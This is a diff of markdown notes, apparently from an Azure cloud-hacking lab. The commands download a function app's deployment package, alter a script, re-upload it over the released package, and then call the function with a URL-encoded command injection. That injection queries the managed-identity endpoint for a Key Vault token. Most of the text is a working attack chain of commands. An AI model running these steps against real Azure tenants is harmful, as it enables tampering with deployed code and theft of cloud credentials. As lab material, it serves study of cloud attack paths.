@@ -4,11 +4,18 @@
 
 ```sh
 az functionapp list
-az functionapp config appsettings list --name <app-name> --resource-group
 az storage blob download --account-name 02fedb58functionapps1 --auth-mode login -c 02fedb58-function-apps-1 -n released-package.zip -f ./released-package.zip
 
+mkdir func_app
+unzip ./released-package.zip -d ./func_app
+cd func_app
+
 # Add or modify existing script (cf. get_token.js) then zip all files and upload them again
-az storage blob upload --account-name 02fedb58functionapps1 --auth-mode login -c 02fedb58-function-apps-1 -n released-package.zip -f ./released-package.zip --overwrite
+zip -r ../released-package.zip .
+
+az storage blob upload --account-name 02fedb58functionapps1 --auth-mode login -c 02fedb58-function-apps-1 -n released-package.zip -f ./released-package.zip --overwrite true
+
+curl "https://d4bcd1d7-function-apps-lab-1.azurewebsites.net/api/hello-world?cmd=curl%20%22%24IDENTITY%5FENDPOINT%3Fresource%3Dhttps%3A%2F%2Fvault%2Eazure%2Enet%26api%2Dversion%3D2017%2D09%2D01%22%20%2DH%20secret%3A%24IDENTITY%5FHEADER"
 ```
 
 ## Bucket overwr­ite File Share
